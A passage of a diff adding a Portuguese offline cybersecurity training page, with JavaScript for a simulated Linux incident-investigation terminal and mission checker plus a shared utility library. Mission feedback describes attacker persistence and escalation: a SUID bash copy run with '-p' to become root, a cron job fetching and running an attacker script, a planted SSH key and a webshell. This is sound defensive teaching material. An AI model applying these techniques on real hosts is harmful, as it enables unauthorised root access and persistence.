+            s += esp ? (x ? t[4] : t[4].toUpperCase()) : (x ? "x" : "-");
+        });
+        return s;
+    }
+    function linhasDe(caminho, cmd) {
+        var n = exigir(caminho, cmd);
+        if (n.tipo === "dir") throw erro(cmd + ": " + caminho + ": É um diretório");
+        return n.conteudo ? n.conteudo.split("\n") : [];
+    }
+
+    // ------------------------------------------------------------ tokenização
+    function dividirPipes(linha) {
+        var partes = [], atual = "", q = null;
+        for (var i = 0; i < linha.length; i++) {
+            var c = linha[i];
+            if (q) { atual += c; if (c === q) q = null; continue; }
+            if (c === "'" || c === "\"") { q = c; atual += c; continue; }
+            if (c === "|") { partes.push(atual); atual = ""; continue; }
+            atual += c;
+        }
+        if (q) throw erro("erro de sintaxe: aspas não fechadas");
+        partes.push(atual);
+        return partes.map(function(p) { return p.trim(); });
+    }
+    function palavras(seg) {
+        var out = [], atual = null, q = null;
+        for (var i = 0; i < seg.length; i++) {
+            var c = seg[i];
+            if (q) { if (c === q) q = null; else atual += c; continue; }
+            if (c === "'" || c === "\"") { q = c; if (atual === null) atual = ""; continue; }
+            if (/\s/.test(c)) { if (atual !== null) { out.push(atual); atual = null; } continue; }
+            atual = (atual === null ? "" : atual) + c;
+        }
+        if (atual !== null) out.push(atual);
+        return out;
+    }
+    function separarOpcoes(args, comValor) {
+        var op = {}, resto = [];
+        for (var i = 0; i < args.length; i++) {
+            var a = args[i];
+            if (a.length > 1 && a[0] === "-" && !/^-\d+$/.test(a) || /^-\d+$/.test(a) && comValor && comValor.numero) {
+                if (/^-\d+$/.test(a)) { op.n = a.slice(1); continue; }
+                if (comValor && comValor[a]) { op[a] = args[++i]; continue; }
+                a.slice(1).split("").forEach(function(l) { op[l] = true; });
+            } else {
+                resto.push(a);
+            }
+        }
+        return { op: op, args: resto };
+    }
+
+    // ------------------------------------------------------------ comandos
+    var COMANDOS = {
+        help: function() {
+            return ["Comandos disponíveis (com pipes |):",
+                "  ls [-l] [-a] [caminho]      cd caminho      pwd      cat arquivo...",
+                "  grep [-i -v -c -o -E] padrão [arquivo]       awk [-F sep] '{print $N}' [arquivo]",
+                "  sort [-n -r -u]   uniq [-c]   head/tail [-n N]   wc -l",
+                "  find caminho [-type f|d] [-perm -MODO|/MODO] [-name padrão]",
+                "  stat caminho      chmod MODO caminho  (ex.: 750, o-w, u+x)",
+                "  ps aux   ss -tlnp   crontab -l [-u usuário]   sudo -l   journalctl -u ssh",
+                "  id   whoami   hostname   history   clear",
+                "Dica: no awk, $(NF-3) conta a partir do fim da linha."];
+        },
+        pwd: function() { return [cwd]; },
+        id: function() { return [LX.saidas.id]; },
+        whoami: function() { return ["root"]; },
+        hostname: function() { return [LX.host]; },
+        history: function() { return historico.map(function(h, i) { return ("    " + (i + 1)).slice(-5) + "  " + h; }); },
+        cd: function(args) {
+            var alvo = resolver(args[0] || "~"), n = exigir(alvo, "cd");
+            if (n.tipo !== "dir") throw erro("cd: " + args[0] + ": Não é um diretório");
+            cwd = alvo;
+            return [];
+        },
+        ls: function(args) {
+            var o = separarOpcoes(args), alvo = resolver(o.args[0] || "."), n = exigir(alvo, "ls");
+            var itens = n.tipo === "dir" ? filhos(alvo) : [alvo];
+            if (!o.op.a) itens = itens.filter(function(c) { return nome(c)[0] !== "."; });
+            if (!o.op.l) return [itens.map(nome).join("  ")].filter(Boolean);
+            var linhas = o.op.a && n.tipo === "dir" ? [[".", n], ["..", no(alvo === "/" ? "/" : (alvo.slice(0, alvo.lastIndexOf("/")) || "/"))]] : [];
+            itens.forEach(function(c) { linhas.push([nome(c), fs[c]]); });
+            var out = ["total " + linhas.length * 4];
+            linhas.forEach(function(par) {
+                var x = par[1], tam = x.tipo === "dir" ? 4096 : (x.tamanho || 0);
+                out.push(stringModo(x) + " 1 " + (x.dono + "        ").slice(0, 8) + " " + (x.grupo + "        ").slice(0, 8) + " " +
+                    ("        " + tam).slice(-8) + " " + x.data + " " + par[0]);
+            });
+            return out;
+        },
+        cat: function(args) {
+            if (!args.length) throw erro("cat: informe um arquivo");
+            var out = [];
+            args.forEach(function(a) { out = out.concat(linhasDe(resolver(a), "cat")); });
+            return out;
+        },
+        grep: function(args, entrada) {
+            var o = separarOpcoes(args);
+            if (!o.args.length) throw erro("grep: informe um padrão");
+            var padrao = o.args[0], arquivos = o.args.slice(1);
+            var fonte = arquivos.length ? arquivos.reduce(function(acc, a) {
+                return acc.concat(linhasDe(resolver(a), "grep").map(function(l) { return { arq: a, l: l }; }));
+            }, []) : (entrada || []).map(function(l) { return { arq: null, l: l }; });
+            var re;
+            try {
+                re = new RegExp(o.op.E ? padrao : padrao.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "g" + (o.op.i ? "i" : ""));
+            } catch (e) { throw erro("grep: expressão regular inválida"); }
+            var casou = fonte.filter(function(x) { re.lastIndex = 0; var t = re.test(x.l); return o.op.v ? !t : t; });
+            if (o.op.c) return [String(casou.length)];
+            var pref = function(x) { return arquivos.length > 1 ? x.arq + ":" : ""; };
+            if (o.op.o && !o.op.v) {
+                var out = [];
+                casou.forEach(function(x) { (x.l.match(re) || []).forEach(function(m) { out.push(pref(x) + m); }); });
+                return out;
+            }
+            return casou.map(function(x) { return pref(x) + x.l; });
+        },
+        awk: function(args, entrada) {
+            var sep = null, resto = [];
+            for (var i = 0; i < args.length; i++) {
+                if (args[i] === "-F") { sep = args[++i]; continue; }
+                if (args[i].indexOf("-F") === 0 && args[i].length > 2) { sep = args[i].slice(2); continue; }
+                resto.push(args[i]);
+            }
+            var prog = (resto[0] || "").trim();
+            var m = prog.match(/^\{\s*print\s+(.+?)\s*;?\s*\}$/);
+            if (!m) throw erro("awk: este laboratório aceita apenas programas no formato '{print $N, ...}'");
+            var campos = m[1].split(",").map(function(x) { return x.trim(); });
+            var linhas = resto[1] ? linhasDe(resolver(resto[1]), "awk") : (entrada || []);
+            return linhas.map(function(l) {
+                var f = sep ? l.split(sep) : l.trim().split(/\s+/);
+                var nf = l.trim() === "" ? 0 : f.length;
+                return campos.map(function(c) {
+                    if (c === "$0") return l;
+                    if (c === "$NF") return f[nf - 1] || "";
+                    if (c === "NF") return String(nf);
+                    var a = c.match(/^\$\(NF-(\d+)\)$/);
+                    if (a) return f[nf - 1 - Number(a[1])] || "";
+                    var b = c.match(/^\$(\d+)$/);
+                    if (b) return f[Number(b[1]) - 1] || "";
+                    var lit = c.match(/^"(.*)"$/);
+                    if (lit) return lit[1];
+                    throw erro("awk: campo não suportado: " + c);
+                }).join(" ");
+            });
+        },
+        sort: function(args, entrada) {
+            var o = separarOpcoes(args);
+            var linhas = o.args[0] ? linhasDe(resolver(o.args[0]), "sort") : (entrada || []).slice();
+            linhas.sort(function(a, b) {
+                if (o.op.n) { var x = parseFloat(a) || 0, y = parseFloat(b) || 0; if (x !== y) return x - y; }
+                return a < b ? -1 : a > b ? 1 : 0;
+            });
+            if (o.op.r) linhas.reverse();
+            if (o.op.u) linhas = linhas.filter(function(l, i) { return i === 0 || l !== linhas[i - 1]; });
+            return linhas;
+        },
+        uniq: function(args, entrada) {
+            var o = separarOpcoes(args), out = [], ant = null, n = 0;
+            var linhas = o.args[0] ? linhasDe(resolver(o.args[0]), "uniq") : (entrada || []);
+            function fechar() { if (ant !== null) out.push(o.op.c ? ("       " + n).slice(-7) + " " + ant : ant); }
+            linhas.forEach(function(l) { if (l === ant) { n++; } else { fechar(); ant = l; n = 1; } });
+            fechar();
+            return out;
+        },
+        head: function(args, entrada) { return cortar(args, entrada, "head"); },
+        tail: function(args, entrada) { return cortar(args, entrada, "tail"); },
+        wc: function(args, entrada) {
+            var o = separarOpcoes(args);
+            if (!o.op.l) throw erro("wc: este laboratório aceita apenas wc -l");
+            var linhas = o.args[0] ? linhasDe(resolver(o.args[0]), "wc") : (entrada || []);
+            return [String(linhas.length) + (o.args[0] ? " " + o.args[0] : "")];
+        },
+        find: function(args) {
+            var base = resolver(args[0] && args[0][0] !== "-" ? args[0] : "."), i = args[0] && args[0][0] !== "-" ? 1 : 0;
+            exigir(base, "find");
+            var tipo = null, perm = null, nomeRe = null;
+            for (; i < args.length; i++) {
+                if (args[i] === "-type") tipo = args[++i];
+                else if (args[i] === "-perm") perm = args[++i];
+                else if (args[i] === "-name") nomeRe = new RegExp("^" + String(args[++i]).replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".") + "$");
+                else if (args[i] === "2>/dev/null") continue;
+                else throw erro("find: opção não suportada: " + args[i]);
+            }
+            var pref = base === "/" ? "/" : base + "/";
+            return Object.keys(fs).filter(function(c) { return c === base || c.indexOf(pref) === 0; }).sort().filter(function(c) {
+                var n = fs[c], m = parseInt(n.modo, 8);
+                if (tipo === "f" && n.tipo !== "arquivo") return false;
+                if (tipo === "d" && n.tipo !== "dir") return false;
+                if (perm) {
+                    var alvo = parseInt(perm.replace(/^[-\/]/, ""), 8);
+                    if (isNaN(alvo)) throw erro("find: modo inválido: " + perm);
+                    if (perm[0] === "/" ? !(m & alvo) : (m & alvo) !== alvo) return false;
+                }
+                if (nomeRe && !nomeRe.test(nome(c))) return false;
+                return true;
+            });
+        },
+        stat: function(args) {
+            var c = resolver(args[0] || ""), n = exigir(c, "stat");
+            return ["  Arquivo: " + c, "  Tipo: " + (n.tipo === "dir" ? "diretório" : "arquivo comum"),
+                "  Acesso: (" + n.modo + "/" + stringModo(n) + ")  Dono: " + n.dono + "  Grupo: " + n.grupo, "  Modificação: " + n.data];
+        },
+        chmod: function(args) {
+            if (args.length < 2) throw erro("chmod: uso: chmod MODO caminho");
+            var modo = args[0], c = resolver(args[1]), n = exigir(c, "chmod"), atual = parseInt(n.modo, 8), novo;
+            if (/^[0-7]{3,4}$/.test(modo)) {
+                novo = parseInt(modo, 8);
+                if (modo.length === 3 && n.tipo === "dir") novo |= atual & 0o6000;
+            } else {
+                novo = atual;
+                modo.split(",").forEach(function(cl) {
+                    var m = cl.match(/^([ugoa]*)([+\-=])([rwxst]*)$/);
+                    if (!m) throw erro("chmod: modo inválido: " + modo);
+                    var quem = m[1] || "a", bits = 0;
+                    if (quem.indexOf("a") !== -1) quem = "ugo";
+                    m[3].split("").forEach(function(p) {
+                        if (p === "s") { if (quem.indexOf("u") !== -1) bits |= 0o4000; if (quem.indexOf("g") !== -1) bits |= 0o2000; return; }
+                        if (p === "t") { bits |= 0o1000; return; }
+                        var v = { r: 4, w: 2, x: 1 }[p];
+                        if (quem.indexOf("u") !== -1) bits |= v << 6;
+                        if (quem.indexOf("g") !== -1) bits |= v << 3;
+                        if (quem.indexOf("o") !== -1) bits |= v;
+                    });
+                    if (m[2] === "+") novo |= bits;
+                    else if (m[2] === "-") novo &= ~bits;
+                    else {
+                        var mascara = 0;
+                        if (quem.indexOf("u") !== -1) mascara |= 0o4700;
+                        if (quem.indexOf("g") !== -1) mascara |= 0o2070;
+                        if (quem.indexOf("o") !== -1) mascara |= 0o1007;
+                        novo = (novo & ~mascara) | bits;
+                    }
+                });
+            }
+            n.modo = ("0000" + novo.toString(8)).slice(-4);
+            return [];
+        },
+        ps: function() { return LX.saidas.ps.split("\n"); },
+        ss: function() { return LX.saidas.ss.split("\n"); },
+        sudo: function(args) {
+            if (args[0] === "-l") return LX.saidas.sudo.split("\n");
+            throw erro("sudo: você já está como root; neste laboratório só sudo -l é suportado");
+        },
+        crontab: function(args) {
+            if (args[0] !== "-l") throw erro("crontab: use crontab -l [-u usuário]");
+            var u = args[1] === "-u" ? args[2] : "root", c = "/var/spool/cron/crontabs/" + u;
+            if (!fs[c]) return ["no crontab for " + u];
+            return fs[c].conteudo.split("\n");
+        },
+        journalctl: function(args) {
+            if (args[0] !== "-u" || ["ssh", "sshd", "ssh.service"].indexOf(args[1]) === -1) throw erro("journalctl: neste laboratório use journalctl -u ssh");
+            return fs["/var/log/auth.log"].conteudo.split("\n").filter(function(l) { return l.indexOf(" sshd[") !== -1; });
+        }
+    };
+    function cortar(args, entrada, cmd) {
+        var o = separarOpcoes(args, { "-n": true, numero: true }), n = parseInt(o.op["-n"] || o.op.n || "10", 10);
+        var linhas = o.args[0] ? linhasDe(resolver(o.args[0]), cmd) : (entrada || []);
+        return cmd === "head" ? linhas.slice(0, n) : linhas.slice(Math.max(0, linhas.length - n));
+    }
+
+    function executarLinha(linha) {
+        var segs = dividirPipes(linha), saida = null;
+        segs.forEach(function(seg, i) {
+            if (!seg) throw erro("erro de sintaxe perto de '|'");
+            var p = palavras(seg).filter(function(w) { return w !== "2>/dev/null"; }), cmd = p[0];
+            if (!COMANDOS[cmd]) throw erro(cmd + ": comando não encontrado (digite help)");
+            saida = COMANDOS[cmd](p.slice(1), i === 0 ? null : saida);
+        });
+        return saida || [];
+    }
+
+    // ------------------------------------------------------------ terminal
+    function prompt() { return "root@" + LX.host + ":" + (cwd === "/root" ? "~" : cwd) + "#"; }
+    function escrever(texto, cor) {
+        var t = document.getElementById("lx-terminal");
+        t.appendChild(el("div", texto, cor ? "color: " + cor + ";" : null));
+        while (t.childNodes.length > 600) t.removeChild(t.firstChild);
+        t.scrollTop = t.scrollHeight;
+    }
+    window.executarComandoLinux = function(texto) {
+        var cmd = String(texto).trim();
+        var p = prompt();
+        if (!cmd) return "";
+        historico.push(cmd);
+        posHist = historico.length;
+        escrever(p + " " + cmd, "#4ade80");
+        if (cmd === "clear") { document.getElementById("lx-terminal").replaceChildren(); atualizarPrompt(); return ""; }
+        var out;
+        try {
+            out = executarLinha(cmd).join("\n");
+            if (out) escrever(out);
+        } catch (e) {
+            if (!e.shell) throw e;
+            out = e.message;
+            escrever(out, "#f87171");
+        }
+        atualizarPrompt();
+        return out;
+    };
+    function atualizarPrompt() { document.getElementById("lx-prompt").textContent = prompt(); }
+    function enviar() {
+        var inp = document.getElementById("lx-entrada");
+        executarComandoLinux(inp.value);
+        inp.value = "";
+        inp.focus();
+    }
+
+    // ------------------------------------------------------------ missões
+    function resultado(n, ok, msg) {
+        var p = document.getElementById("lx-r" + n);
+        p.textContent = (ok ? "✓ " : "✗ ") + msg;
+        p.style.color = ok ? "var(--tip-color)" : "var(--danger-color)";
+    }
+    window.verificarMissaoLinux = function(n) {
+        var M = LX.missoes;
+        if (n === 1) {
+            var v = document.getElementById("lx-m1").value.trim();
+            if (v === M.suid) resultado(1, true, "Correto: uma cópia do bash com SUID do root, escondida numa pasta oculta de /tmp. Qualquer usuário que rodar \"" + M.suid + " -p\" vira root.");
+            else resultado(1, false, "Ainda não. Use find / -perm -4000 -type f e compare com os SUID que todo Ubuntu tem (passwd, sudo, su, mount...).");
+        } else if (n === 2) {
+            var ip = document.getElementById("lx-m2ip").value.trim(), conta = document.getElementById("lx-m2conta").value.trim().toLowerCase();
+            if (ip === M.ip && conta === M.conta) resultado(2, true, "Correto: 28 falhas e depois um Accepted password para " + M.conta + " às 03:13:05. A senha antiga ($6$ no shadow) e o NOPASSWD no sudoers fizeram o resto.");
+            else if (ip === M.ip) resultado(2, false, "O IP está certo. Agora procure o Accepted password vindo dele.");
+            else resultado(2, false, "Ainda não. Tente: grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn");
+        } else if (n === 3) {
+            var nn = fs[M.permissao], m = parseInt(nn.modo, 8);
+            if (!(m & 0o002) && (m & 0o700) === 0o700) resultado(3, true, "Correto: " + M.permissao + " agora está " + nn.modo.slice(1) + " (" + stringModo(nn) + "). O dono www-data continua gravando os uploads; ninguém mais grava ali.");
+            else if (m & 0o002) resultado(3, false, "Os outros ainda podem gravar (" + stringModo(nn) + "). Tente chmod 750 " + M.permissao + " ou chmod o-w " + M.permissao + ".");
+            else resultado(3, false, "Os outros não gravam mais, mas o dono www-data perdeu permissões (" + stringModo(nn) + ") e a loja não salvaria uploads. O dono precisa de rwx.");
+        } else if (n === 4) {
+            var c = document.getElementById("lx-m4").value.trim();
+            if (c === M.cron) resultado(4, true, "Correto: a cada minuto, o root baixa e executa um script do servidor do atacante. Não esqueça a chave extra em /home/deploy/.ssh/authorized_keys e o webshell em /srv/app/uploads.");
+            else resultado(4, false, "Ainda não. Liste /etc/cron.d com ls -la e leia cada arquivo; o backup-loja é legítimo.");
+        }
+    };
+
+    window.restaurarLinux = function() {
+        fs = JSON.parse(JSON.stringify(LX.fs));
+        cwd = "/root";
+        historico = [];
+        posHist = 0;
+        document.getElementById("lx-terminal").replaceChildren();
+        escrever("Sessão de investigação em " + LX.host + ". Digite help para ver os comandos.", "#38bdf8");
+        atualizarPrompt();
+        ["lx-m1", "lx-m2ip", "lx-m2conta", "lx-m4"].forEach(function(id) { document.getElementById(id).value = ""; });
+        [1, 2, 3, 4].forEach(function(n) { document.getElementById("lx-r" + n).textContent = ""; });
+    };
+
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById("lx-contexto").textContent = LX.contexto;
+        var inp = document.getElementById("lx-entrada");
+        inp.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") { e.preventDefault(); enviar(); }
+            else if (e.key === "ArrowUp" && historico.length) { e.preventDefault(); posHist = Math.max(0, posHist - 1); inp.value = historico[posHist]; }
+            else if (e.key === "ArrowDown" && historico.length) { e.preventDefault(); posHist = Math.min(historico.length, posHist + 1); inp.value = historico[posHist] || ""; }
+        });
+        document.getElementById("lx-executar").addEventListener("click", enviar);
+        var box = document.getElementById("lx-atalhos");
+        ATALHOS.forEach(function(c) {
+            var b = el("button", c, "font-family: var(--font-mono); font-size: 0.72rem; padding: 0.2rem 0.5rem;");
+            b.type = "button";
+            b.className = "btn-secondary";
+            b.addEventListener("click", function() { executarComandoLinux(c); });
+            box.appendChild(b);
+        });
+        restaurarLinux();
+        if (typeof initChecklist === "function") {
+            initChecklist("linux-seguranca");
+        }
+        if (typeof initQuiz === "function") {
+            initQuiz();
+        }
+    });
+})();
+</script>
+    <footer class="study-footer">
+      <p>&copy; 2026 Estudos em Cibersegurança &bull; Material Autoinstrucional e Prático 100% Offline</p>
+      <p><a href="../index.html">← Painel de Estudos</a> &bull; Curadoria e Desenvolvimento por José Mauro da Silva Brandão</p>
+    </footer>
+  </main>
+
+  <!-- Scripts Interativos Embutidos -->
+  <script>
+/**
+ * ============================================================================
+ * ESTUDOS DE CIBERSEGURANÇA — BIBLIOTECA BASE COMPARTILHADA (base.js)
+ * Utilitários reativos, persistência local segura, acessibilidade e interatividade.
+ * Vanilla JavaScript (Zero dependências externas, 100% offline-ready).
+ * ============================================================================
+ */
+
+(function (window, document) {
+  'use strict';
+
+  // --------------------------------------------------------------------------
+  // 0. Utilitários Seguros de Armazenamento Local (localStorage)
+  // --------------------------------------------------------------------------
+  function safeStorageGet(key) {
+    try {
+      if (typeof window !== 'undefined' && window.localStorage) {
+        return window.localStorage.getItem(key);
+      }
+    } catch (e) {
+      console.warn(`[CS] Falha ao ler localStorage chave "${key}":`, e);
+    }
+    return null;
+  }
+
+  function safeStorageSet(key, value) {
+    try {
+      if (typeof window !== 'undefined' && window.localStorage) {
+        window.localStorage.setItem(key, String(value));
+        return true;
+      }
+    } catch (e) {
+      console.warn(`[CS] Falha ao gravar localStorage chave "${key}":`, e);
+    }
+    return false;
+  }
+
+  // --------------------------------------------------------------------------
+  // 1. Gerenciamento de Tema (Claro / Escuro)
+  // --------------------------------------------------------------------------
+  const THEME_STORAGE_KEY = 'cs_theme';
+
+  function applyTheme(theme) {
+    if (theme === 'dark') {
+      document.documentElement.setAttribute('data-theme', 'dark');
+    } else if (theme === 'light') {
+      document.documentElement.setAttribute('data-theme', 'light');
+    } else {
+      document.documentElement.removeAttribute('data-theme');
+    }
+    updateThemeButtons(theme);
+  }
+
+  function getSystemTheme() {
+    return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+      ? 'dark'
+      : 'light';
+  }
+
+  function getCurrentTheme() {
+    const saved = safeStorageGet(THEME_STORAGE_KEY);
+    return saved || getSystemTheme();
+  }
+
+  function updateThemeButtons(currentTheme) {
+    const effectiveTheme = currentTheme === 'dark' || (!currentTheme && getSystemTheme() === 'dark') ? 'dark' : 'light';
+    const buttons = document.querySelectorAll('.theme-toggle-btn, [data-theme-toggle]');
+    buttons.forEach((btn) => {
+      btn.setAttribute('aria-label', effectiveTheme === 'dark' ? 'Alternar para tema claro' : 'Alternar para tema escuro');
+      btn.innerHTML = effectiveTheme === 'dark'
+        ? '<span class="theme-icon">☀️</span> <span class="theme-label">Claro</span>'
+        : '<span class="theme-icon">🌙</span> <span class="theme-label">Escuro</span>';
+    });
+  }
+
+  function toggleTheme() {
+    const current = getCurrentTheme();
+    const next = current === 'dark' ? 'light' : 'dark';
+    safeStorageSet(THEME_STORAGE_KEY, next);
+    applyTheme(next);
+    return next;
+  }
+
+  function initTheme() {
+    const saved = safeStorageGet(THEME_STORAGE_KEY);
+    if (saved) {
+      applyTheme(saved);
+    } else {
+      updateThemeButtons(getSystemTheme());
+    }
+
+    // Monitora preferência do sistema operacional caso usuário não tenha fixado
+    if (window.matchMedia) {
+      window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
+        if (!safeStorageGet(THEME_STORAGE_KEY)) {
+          updateThemeButtons(e.matches ? 'dark' : 'light');
+        }
+      });
+    }
+
+    // Vincula cliques em botões de tema
+    document.querySelectorAll('.theme-toggle-btn, [data-theme-toggle]').forEach((btn) => {
+      btn.onclick = toggleTheme;
+    });
+  }
+
+  // --------------------------------------------------------------------------
+  // 2. Checklist Operacional Interativo & Status de Conclusão de Estudo
+  // --------------------------------------------------------------------------
+  function extractSlug() {
+    if (document.body && document.body.dataset && document.body.dataset.slug) {
+      return document.body.dataset.slug;
+    }
+    const metaSlug = document.querySelector('meta[name="study-slug"]');
+    if (metaSlug && metaSlug.content) {
+      return metaSlug.content;
+    }
+    // Fallback: tenta obter do pathname
+    const match = window.location.pathname.match(/treinamento-([^.]+)\.html/);
+    if (match) {
+      return match[1];
+    }
+    return 'default';
+  }
+
+  function updateChecklistProgress(checklistEl) {
+    const checkboxes = checklistEl.querySelectorAll('input[type="checkbox"]');
+    if (!checkboxes.length) return;
+
+    let checkedCount = 0;
+    checkboxes.forEach((cb) => {
+      if (cb.checked) checkedCount++;
+    });
+
+    const progressFill = checklistEl.querySelector('.checklist-progress-fill');
+    if (progressFill) {
+      const pct = Math.round((checkedCount / checkboxes.length) * 100);
+      progressFill.style.width = `${pct}%`;
+    }
+
+    const counterEl = checklistEl.querySelector('.checklist-counter');
+    if (counterEl) {
+      counterEl.textContent = `${checkedCount} de ${checkboxes.length} itens auditados`;
+    }
+  }
+
+  function initChecklist(slug) {
+    const activeSlug = slug || extractSlug();
+    const checklists = document.querySelectorAll('.checklist');
+
+    checklists.forEach((checklist, listIdx) => {
+      const listId = checklist.dataset.checklistId || `list_${listIdx}`;
+      const items = checklist.querySelectorAll('.check-item');
+
+      items.forEach((item, itemIdx) => {
+        const checkbox = item.querySelector('input[type="checkbox"]');
+        if (!checkbox) return;
+
+        const itemId = checkbox.id || checkbox.getAttribute('data-id') || `${listId}_${itemIdx}`;
+        const storageKey = `cs_check_${activeSlug}_${itemId}`;
+
+        // Restaura estado
+        const savedState = safeStorageGet(storageKey);
+        if (savedState === 'true') {
+          checkbox.checked = true;
+          item.classList.add('completed');
+        } else {
+          checkbox.checked = false;
+          item.classList.remove('completed');
+        }
+
+        // Event listener
+        checkbox.onchange = function () {
+          safeStorageSet(storageKey, checkbox.checked ? 'true' : 'false');
+          if (checkbox.checked) {
+            item.classList.add('completed');
+          } else {
+            item.classList.remove('completed');
+          }
+          updateChecklistProgress(checklist);
+        };
+      });
+
+      updateChecklistProgress(checklist);
+    });
+  }
+
+  function isStudyDone(slug) {
+    const activeSlug = slug || extractSlug();
+    return safeStorageGet(`cs_done_${activeSlug}`) === 'true';
+  }
+
+  function setStudyDone(slug, isDone) {
+    const activeSlug = slug || extractSlug();
+    const doneValue = isDone !== false;
+    return safeStorageSet(`cs_done_${activeSlug}`, doneValue ? 'true' : 'false');
+  }
+
+  // --------------------------------------------------------------------------
+  // 3. Sistema de Quiz com Feedback Explicativo
+  // --------------------------------------------------------------------------
+  function checkQuiz(btn, isCorrect, explanation) {
+    const quizItem = btn.closest('.quiz-item');
+    if (!quizItem) return;
+
+    // Desabilita botões para registrar a tentativa
+    const buttons = quizItem.querySelectorAll('.quiz-btn');
+    buttons.forEach((b) => {
+      b.disabled = true;
+      b.classList.remove('selected');
+    });
+
+    // Destaca o botão clicado
+    btn.classList.add('selected');
+    if (isCorrect) {
+      btn.classList.add('correct');
+    } else {
+      btn.classList.add('incorrect');
+    }
+
+    // Exibe ou atualiza o painel de feedback
+    let feedbackEl = quizItem.querySelector('.quiz-feedback');
+    if (!feedbackEl) {
+      feedbackEl = document.createElement('div');
+      feedbackEl.className = 'quiz-feedback';
+      quizItem.appendChild(feedbackEl);
+    }
+
+    feedbackEl.className = `quiz-feedback ${isCorrect ? 'correct' : 'incorrect'}`;
+    const icon = isCorrect ? '✅' : '❌';
+    const statusText = isCorrect ? 'Correto!' : 'Incorreto.';
+    feedbackEl.innerHTML = `<strong>${icon} ${statusText}</strong> ${escapeHtml(explanation || '')}`;
+    feedbackEl.style.display = 'block';
+  }
+
+  function initQuiz() {
+    const quizItems = document.querySelectorAll('.quiz-item');
+    quizItems.forEach((quiz, idx) => {
+      const qId = quiz.dataset.quizId || `quiz_${idx}`;
+      quiz.setAttribute('data-initialized', 'true');
+    });
+  }
+
+  // --------------------------------------------------------------------------
+  // 4. Copiar Código para Área de Transferência
+  // --------------------------------------------------------------------------
+  function copyCode(button, targetId) {
+    let textToCopy = '';
+
+    if (targetId) {
+      const targetEl = document.getElementById(targetId);
+      if (targetEl) {
+        textToCopy = targetEl.innerText || targetEl.textContent;
+      }
+    } else if (button) {
+      const terminalBox = button.closest('.terminal-box') || button.parentElement;
+      const codeEl = terminalBox ? terminalBox.querySelector('pre code, pre, code') : null;
+      if (codeEl) {
+        textToCopy = codeEl.innerText || codeEl.textContent;
+      }
+    }
+
+    if (!textToCopy) return;
+
+    const originalText = button ? button.innerText : 'Copiar';
+
+    function setSuccess() {
+      if (button) {
+        button.innerText = '✓ Copiado!';
+        button.classList.add('copied');
+        setTimeout(() => {
+          button.innerText = originalText;
+          button.classList.remove('copied');
+        }, 2000);
+      }
+    }
+
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(textToCopy.trim()).then(setSuccess).catch(() => {
+        fallbackCopy(textToCopy.trim(), setSuccess);
+      });
+    } else {
+      fallbackCopy(textToCopy.trim(), setSuccess);
+    }
+  }
+
+  function fallbackCopy(text, callback) {
+    if (!document.body) {
+      console.warn('document.body não está pronto para cópia via textarea.');
+      return;
+    }
+
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    textarea.select();
+    try {
+      const successful = document.execCommand('copy');
+      if (successful && callback) {
+        callback();
+      }
+    } catch (e) {
+      console.warn('Falha ao copiar texto:', e);
+    } finally {
+      if (textarea.parentNode) {
+        textarea.parentNode.removeChild(textarea);
+      }
+    }
+  }
+
+  // --------------------------------------------------------------------------
+  // 5. Utilitários Reutilizáveis para Simuladores e Laboratórios
+  // --------------------------------------------------------------------------
+  function escapeHtml(str) {
+    if (str === null || str === undefined) return '';
+    return String(str)
+      .replace(/&/g, '&amp;')
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .replace(/'/g, '&#39;');
+  }
+
+  function formatBytes(bytes, decimals = 2) {
+    if (!+bytes || bytes < 0) return '0 Bytes';
+    const k = 1024;
+    const dm = decimals < 0 ? 0 : decimals;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
+  }
+
+  function formatNumber(num) {
+    if (isNaN(num)) return '0';
+    return new Intl.NumberFormat('pt-BR').format(num);
+  }
+
+  function bytesToHex(uint8Array) {
+    return Array.from(uint8Array)
+      .map((b) => b.toString(16).padStart(2, '0'))
+      .join('');
+  }
+
+  function hexToBytes(hexString) {
+    let cleaned = String(hexString || '').replace(/\s+/g, '');
+    if (cleaned.length % 2 !== 0) {
+      cleaned = '0' + cleaned;
+    }
+    const bytes = new Uint8Array(cleaned.length / 2);
+    for (let i = 0; i < cleaned.length; i += 2) {
+      bytes[i / 2] = parseInt(cleaned.substring(i, i + 2), 16);
+    }
+    return bytes;
+  }
+
+  async function sha256Hex(message) {
+    if (!window.crypto || !window.crypto.subtle) {
+      throw new Error('Web Cryptography API não suportada neste ambiente.');
+    }
+    const msgUint8 = new TextEncoder().encode(message);
+    const hashBuffer = await window.crypto.subtle.digest('SHA-256', msgUint8);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  // --------------------------------------------------------------------------
+  // 6. Exposição Global de Funções & Inicialização Automática
+  // --------------------------------------------------------------------------
+  window.safeStorageGet = safeStorageGet;
+  window.safeStorageSet = safeStorageSet;
+  window.initTheme = initTheme;
+  window.toggleTheme = toggleTheme;
+  window.initChecklist = initChecklist;
+  window.isStudyDone = isStudyDone;
+  window.setStudyDone = setStudyDone;
+  window.initQuiz = initQuiz;
+  window.checkQuiz = checkQuiz;
+  window.copyCode = copyCode;
+  window.escapeHtml = escapeHtml;
+  window.formatBytes = formatBytes;
+  window.formatNumber = formatNumber;
+  window.bytesToHex = bytesToHex;
+  window.hexToBytes = hexToBytes;
+  window.sha256Hex = sha256Hex;
+
+  // Namespace unificado
+  window.CS = {
+    safeStorageGet,
+    safeStorageSet,
